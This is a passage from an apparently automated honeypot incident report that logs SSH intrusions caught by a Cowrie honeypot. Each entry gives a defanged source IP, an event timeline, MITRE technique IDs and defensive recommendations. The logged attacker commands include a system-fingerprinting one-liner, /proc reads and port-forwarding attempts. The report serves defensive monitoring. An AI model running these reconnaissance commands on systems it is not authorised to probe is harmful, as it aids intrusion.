| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:18:11` | `cowrie.session.connect` |
| `2026-07-10 13:18:12` | `cowrie.client.version` |
| `2026-07-10 13:18:12` | `cowrie.client.kex` |
| `2026-07-10 13:18:13` | `cowrie.login.success` |
| `2026-07-10 13:18:14` | `cowrie.session.params` |
| `2026-07-10 13:18:14` | `cowrie.command.input` |
| `2026-07-10 13:18:14` | `cowrie.command.input` |
| `2026-07-10 13:18:14` | `cowrie.command.input` |
| `2026-07-10 13:18:14` | `cowrie.command.input` |
| `2026-07-10 13:18:14` | `cowrie.command.input` |
| `2026-07-10 13:18:14` | `cowrie.command.success` |
| `2026-07-10 13:18:14` | `cowrie.command.input` |
| `2026-07-10 13:18:14` | `cowrie.command.input` |
| `2026-07-10 13:18:14` | `cowrie.command.input` |
| `2026-07-10 13:18:14` | `cowrie.command.input` |
| `2026-07-10 13:18:15` | `cowrie.log.closed` |
| `2026-07-10 13:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46759a6853fe

| Field | Detail |
|---|---|
| **Source IP** | `92.126.223[.]175` |
| **First Seen** | 2026-07-10 13:18 |
| **Last Seen** | 2026-07-10 13:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:18:17` | `cowrie.session.connect` |
| `2026-07-10 13:18:17` | `cowrie.client.version` |
| `2026-07-10 13:18:17` | `cowrie.client.kex` |
| `2026-07-10 13:18:20` | `cowrie.login.success` |
| `2026-07-10 13:18:20` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:18:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.126.223[.]175` to AbuseIPDB if not already reported
- [ ] Block `92.126.223[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-045df9f3dabb

| Field | Detail |
|---|---|
| **Source IP** | `61.12.84[.]172` |
| **First Seen** | 2026-07-10 13:18 |
| **Last Seen** | 2026-07-10 13:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:18:27` | `cowrie.session.connect` |
| `2026-07-10 13:18:28` | `cowrie.client.version` |
| `2026-07-10 13:18:28` | `cowrie.client.kex` |
| `2026-07-10 13:18:30` | `cowrie.login.success` |
| `2026-07-10 13:18:31` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0e91552f344

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:19 |
| **Last Seen** | 2026-07-10 13:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:19:24` | `cowrie.session.connect` |
| `2026-07-10 13:19:24` | `cowrie.client.version` |
| `2026-07-10 13:19:24` | `cowrie.client.kex` |
| `2026-07-10 13:19:25` | `cowrie.login.success` |
| `2026-07-10 13:19:26` | `cowrie.session.params` |
| `2026-07-10 13:19:26` | `cowrie.command.input` |
| `2026-07-10 13:19:26` | `cowrie.command.input` |
| `2026-07-10 13:19:26` | `cowrie.command.input` |
| `2026-07-10 13:19:26` | `cowrie.command.input` |
| `2026-07-10 13:19:26` | `cowrie.command.input` |
| `2026-07-10 13:19:26` | `cowrie.command.success` |
| `2026-07-10 13:19:26` | `cowrie.command.input` |
| `2026-07-10 13:19:26` | `cowrie.command.input` |
| `2026-07-10 13:19:26` | `cowrie.command.input` |
| `2026-07-10 13:19:26` | `cowrie.command.input` |
| `2026-07-10 13:19:27` | `cowrie.log.closed` |
| `2026-07-10 13:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-745fa5540a66

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 13:20 |
| **Last Seen** | 2026-07-10 13:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:20:12` | `cowrie.session.connect` |
| `2026-07-10 13:20:12` | `cowrie.client.version` |
| `2026-07-10 13:20:12` | `cowrie.client.kex` |
| `2026-07-10 13:20:13` | `cowrie.login.success` |
| `2026-07-10 13:20:13` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:20:13` | `cowrie.direct-tcpip.data` |
| `2026-07-10 13:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a373f182e2d1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 13:20 |
| **Last Seen** | 2026-07-10 13:20 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:20:39` | `cowrie.session.connect` |
| `2026-07-10 13:20:40` | `cowrie.client.version` |
| `2026-07-10 13:20:40` | `cowrie.client.kex` |
| `2026-07-10 13:20:47` | `cowrie.login.success` |
| `2026-07-10 13:20:51` | `cowrie.session.params` |
| `2026-07-10 13:20:51` | `cowrie.command.input` |
| `2026-07-10 13:20:53` | `cowrie.log.closed` |
| `2026-07-10 13:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b1198bd7281

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 13:28 |
| **Last Seen** | 2026-07-10 13:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:28:41` | `cowrie.session.connect` |
| `2026-07-10 13:28:41` | `cowrie.client.version` |
| `2026-07-10 13:28:41` | `cowrie.client.kex` |
| `2026-07-10 13:28:41` | `cowrie.login.success` |
| `2026-07-10 13:28:41` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:28:42` | `cowrie.direct-tcpip.data` |
| `2026-07-10 13:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f96d64422e6e

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-07-10 13:32 |
| **Last Seen** | 2026-07-10 13:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:32:40` | `cowrie.session.connect` |
| `2026-07-10 13:32:41` | `cowrie.client.version` |
| `2026-07-10 13:32:41` | `cowrie.client.kex` |
| `2026-07-10 13:32:43` | `cowrie.login.success` |
| `2026-07-10 13:32:44` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dba05f9197c8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 13:33 |
| **Last Seen** | 2026-07-10 13:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:33:09` | `cowrie.session.connect` |
| `2026-07-10 13:33:09` | `cowrie.client.version` |
| `2026-07-10 13:33:09` | `cowrie.client.kex` |
| `2026-07-10 13:33:09` | `cowrie.login.success` |
| `2026-07-10 13:33:09` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:33:10` | `cowrie.direct-tcpip.data` |
| `2026-07-10 13:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aef593b368af

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:35 |
| **Last Seen** | 2026-07-10 13:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:35:36` | `cowrie.session.connect` |
| `2026-07-10 13:35:39` | `cowrie.login.success` |
| `2026-07-10 13:35:40` | `cowrie.session.params` |
| `2026-07-10 13:35:41` | `cowrie.command.input` |
| `2026-07-10 13:35:48` | `cowrie.log.closed` |
| `2026-07-10 13:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a31ff9e839c7

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:35 |
| **Last Seen** | 2026-07-10 13:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:35:53` | `cowrie.session.connect` |
| `2026-07-10 13:35:56` | `cowrie.login.success` |
| `2026-07-10 13:35:56` | `cowrie.session.params` |
| `2026-07-10 13:35:58` | `cowrie.command.input` |
| `2026-07-10 13:36:04` | `cowrie.log.closed` |
| `2026-07-10 13:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33641880b11f

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:36 |
| **Last Seen** | 2026-07-10 13:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:36:04` | `cowrie.session.connect` |
| `2026-07-10 13:36:08` | `cowrie.login.success` |
| `2026-07-10 13:36:08` | `cowrie.session.params` |
| `2026-07-10 13:36:10` | `cowrie.command.input` |
| `2026-07-10 13:36:16` | `cowrie.log.closed` |
| `2026-07-10 13:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e8e3b3ecf6a

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]119` |
| **First Seen** | 2026-07-10 13:36 |
| **Last Seen** | 2026-07-10 13:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:36:09` | `cowrie.session.connect` |
| `2026-07-10 13:36:09` | `cowrie.client.version` |
| `2026-07-10 13:36:09` | `cowrie.client.kex` |
| `2026-07-10 13:36:12` | `cowrie.login.success` |
| `2026-07-10 13:36:12` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-190d43cf90ff

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:36 |
| **Last Seen** | 2026-07-10 13:36 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:36:16` | `cowrie.session.connect` |
| `2026-07-10 13:36:20` | `cowrie.login.success` |
| `2026-07-10 13:36:21` | `cowrie.session.params` |
| `2026-07-10 13:36:22` | `cowrie.command.input` |
| `2026-07-10 13:36:28` | `cowrie.log.closed` |
| `2026-07-10 13:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdf8730bb4f2

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-07-10 13:36 |
| **Last Seen** | 2026-07-10 13:41 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:36:22` | `cowrie.session.connect` |
| `2026-07-10 13:36:22` | `cowrie.client.version` |
| `2026-07-10 13:36:22` | `cowrie.client.kex` |
| `2026-07-10 13:36:24` | `cowrie.login.success` |
| `2026-07-10 13:36:24` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef3267c24978

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:36 |
| **Last Seen** | 2026-07-10 13:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:36:28` | `cowrie.session.connect` |
| `2026-07-10 13:36:31` | `cowrie.login.success` |
| `2026-07-10 13:36:32` | `cowrie.session.params` |
| `2026-07-10 13:36:33` | `cowrie.command.input` |
| `2026-07-10 13:36:40` | `cowrie.log.closed` |
| `2026-07-10 13:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df93944437b4

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:36 |
| **Last Seen** | 2026-07-10 13:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:36:40` | `cowrie.session.connect` |
| `2026-07-10 13:36:43` | `cowrie.login.success` |
| `2026-07-10 13:36:44` | `cowrie.session.params` |
| `2026-07-10 13:36:45` | `cowrie.command.input` |
| `2026-07-10 13:36:51` | `cowrie.log.closed` |
| `2026-07-10 13:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dbeb0b4d053

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:36 |
| **Last Seen** | 2026-07-10 13:37 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:36:51` | `cowrie.session.connect` |
| `2026-07-10 13:36:55` | `cowrie.login.success` |
| `2026-07-10 13:36:56` | `cowrie.session.params` |
| `2026-07-10 13:36:57` | `cowrie.command.input` |
| `2026-07-10 13:37:03` | `cowrie.log.closed` |
| `2026-07-10 13:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e775cc38f1aa

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:37 |
| **Last Seen** | 2026-07-10 13:37 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:37:03` | `cowrie.session.connect` |
| `2026-07-10 13:37:07` | `cowrie.login.success` |
| `2026-07-10 13:37:07` | `cowrie.session.params` |
| `2026-07-10 13:37:09` | `cowrie.command.input` |
| `2026-07-10 13:37:15` | `cowrie.log.closed` |
| `2026-07-10 13:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43297bf1638b

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:37 |
| **Last Seen** | 2026-07-10 13:37 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:37:15` | `cowrie.session.connect` |
| `2026-07-10 13:37:19` | `cowrie.login.success` |
| `2026-07-10 13:37:19` | `cowrie.session.params` |
| `2026-07-10 13:37:21` | `cowrie.command.input` |
| `2026-07-10 13:37:27` | `cowrie.log.closed` |
| `2026-07-10 13:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b93708f31976

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:37 |
| **Last Seen** | 2026-07-10 13:37 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:37:27` | `cowrie.session.connect` |
| `2026-07-10 13:37:30` | `cowrie.login.success` |
| `2026-07-10 13:37:31` | `cowrie.session.params` |
| `2026-07-10 13:37:32` | `cowrie.command.input` |
| `2026-07-10 13:37:39` | `cowrie.log.closed` |
| `2026-07-10 13:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-913bdb5659e1

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:37 |
| **Last Seen** | 2026-07-10 13:37 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:37:39` | `cowrie.session.connect` |
| `2026-07-10 13:37:42` | `cowrie.login.success` |
| `2026-07-10 13:37:43` | `cowrie.session.params` |
| `2026-07-10 13:37:44` | `cowrie.command.input` |
| `2026-07-10 13:37:51` | `cowrie.log.closed` |
| `2026-07-10 13:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6c10e1a821

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:37 |
| **Last Seen** | 2026-07-10 13:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:37:51` | `cowrie.session.connect` |
| `2026-07-10 13:37:54` | `cowrie.login.success` |
| `2026-07-10 13:37:54` | `cowrie.session.params` |
| `2026-07-10 13:37:56` | `cowrie.command.input` |
| `2026-07-10 13:38:02` | `cowrie.log.closed` |
| `2026-07-10 13:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41e40ae0d5a1

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:38 |
| **Last Seen** | 2026-07-10 13:38 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:38:02` | `cowrie.session.connect` |
| `2026-07-10 13:38:06` | `cowrie.login.success` |
| `2026-07-10 13:38:07` | `cowrie.session.params` |
| `2026-07-10 13:38:09` | `cowrie.command.input` |
| `2026-07-10 13:38:14` | `cowrie.log.closed` |
| `2026-07-10 13:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e634c09e453

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:38 |
| **Last Seen** | 2026-07-10 13:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:38:14` | `cowrie.session.connect` |
| `2026-07-10 13:38:18` | `cowrie.login.success` |
| `2026-07-10 13:38:18` | `cowrie.session.params` |
| `2026-07-10 13:38:20` | `cowrie.command.input` |
| `2026-07-10 13:38:26` | `cowrie.log.closed` |
